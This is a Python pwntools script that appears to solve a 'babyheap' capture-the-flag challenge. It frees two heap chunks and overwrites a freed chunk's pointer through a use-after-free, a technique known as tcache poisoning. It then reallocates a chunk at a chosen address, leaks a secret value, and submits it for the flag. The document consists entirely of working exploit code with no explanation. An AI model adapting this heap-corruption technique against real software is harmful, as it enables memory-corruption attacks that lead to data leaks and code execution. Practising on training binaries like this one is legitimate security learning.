from pwn import *
r = process("/challenge/babyheap_level6.0")
leak_addr = 0x425c69
for i in range(0,2): # allocate 2 chuncks
	r.sendline("malloc")
	r.sendline(str(i))
	r.sendline("16")
for b in range(0,2): # write on the address to be 0x425c69
	r.sendline("free")
	r.sendline(str(b))
r.sendline("scanf")
r.sendline("1")
r.sendline(p64(leak_addr))
for c in range(0,2):
	r.sendline("malloc")
	r.sendline(str(c))
	r.sendline("16")
r.read()
r.sendline("puts")
r.sendline("1")
secret = r.read()[875:-56]
log.info(f"Secret Value :{secret.decode()}")
r.sendline("send_flag")
r.sendline(secret[1:])
r.interactive()
